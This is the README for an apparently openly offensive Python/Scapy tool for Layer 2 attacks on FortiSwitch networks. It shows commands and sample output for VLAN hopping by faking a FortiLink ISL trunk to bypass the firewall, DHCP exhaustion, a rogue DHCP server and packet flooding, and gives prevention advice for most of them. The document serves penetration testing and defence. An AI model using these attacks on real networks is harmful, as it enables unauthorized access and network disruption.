# FortiSwitch Layer 2 Attacks

[![License](https://img.shields.io/badge/license-GPLv2-blue.svg)](LICENSE)

## Disclaimer 
This tool is for educational purposes and lawful use only. Always ensure you have the necessary permissions before using it. Unauthorized attacks can lead to criminal charges.

## Overview

This repository contains a tool designed to execute various Layer 2 attacks on a FortiSwitch. Currently only the VLAN Hopping attack is FortiSwitch specific, all other attacks will work in other setups as well.


## Prerequisites

- Python 3.x
- Scapy
- tcpreplay

## Installation

```bash
apt-get install scapy3
apt-get install tcpreplay
```

## Features



### VLAN Hopping

By default Fortiswitches establish ISL tunnels (VLAN Trunks) automatically to other FortiSwitches. This attack will simulate a FortiSwitch and establish a FortiLink ISL Tunnel to a FortiSwitch from your computer. This allows access all VLANs bypassing the Firewall.

#### Attack

```
sudo ./fsw_l2_attack.py vlanhop
Launching vlanhop attack
Listening for LLDP packets...received
System name: SW2-1
System description: FortiSwitch-448E-FPOE v7.2.5,build0453,230707 (GA)
Switchport interface: port1
Switch management address: 10.255.1.6
Listening for Fortigate LLDP TLVs...Found
Switch Serialnumber: S448EFTF23000000
Establishing FortiLink ISL...LACP Trunk established

To access the VLANs from your host run:  sudo ip link add link ens33 name ens33.<vlan-id> type vlan id <vlan-id>
Keep this program running in the background

Detected VLANs (passivly):
200
210
```

#### Prevent

Either disable LLDP completely on the switchports or change assigned LLDP Profile from 'default-auto-isl' to 'default'.



### DHCP Exhaustion

Request all available free IP addresses on the DHCP Server.

```
sudo ./fsw_l2_attack.py dhcpexhaustion
Launching DHCP Server exhaustion attack
Requesting 192.168.100.54 ...
Requesting 192.168.100.55 ...
Requesting 192.168.100.56 ...
Requesting 192.168.100.57 ...
```


### DHCP Server

#### Attack

A very simplistics DHCP Server able to server IPs to clients according to the application arguments.

```
sudo ./fsw_l2_attack.py dhcpserver --scope 192.168.1.30-192.168.1.40 --subnetmask 255.255.255.0 --gateway 192.168.1.1 --dns 8.8.8.8
Launching DHCP Server
192.168.1.30-192.168.1.40
Start IP: 192.168.1.30
End IP: 192.168.1.40
Listening for Discover packages
192.168.1.30 is free
Answering DHCP Request
192.168.1.30 is free
Answering DHCP Request
```

#### Prevention

Enable DHCP Snooping on the VLAN.



### Flood

Flood will prepare packets in memory, and send out all at maximum speed. Created to test storm control.

#### Attack

```
sudo ./fsw_l2_attack.py flood -t unknown_multicast -c 1000
Launching flood attack: unknown_multicast
Generating 1000 multicast flood packets
Sending packets...Done
```
#### Prevent

Set MAC address learning limit per port to prevent CAM table overflow. Enable storm control to limit impact on network and switch/firewall processes.

## Disclaimer

This tool is provided "as is" without any guarantees or warranty. Use at your own risk. Always ensure you are authorized to perform any tests.
License

## License

This project is licensed under the [GNU General Public License v2.0](LICENSE).
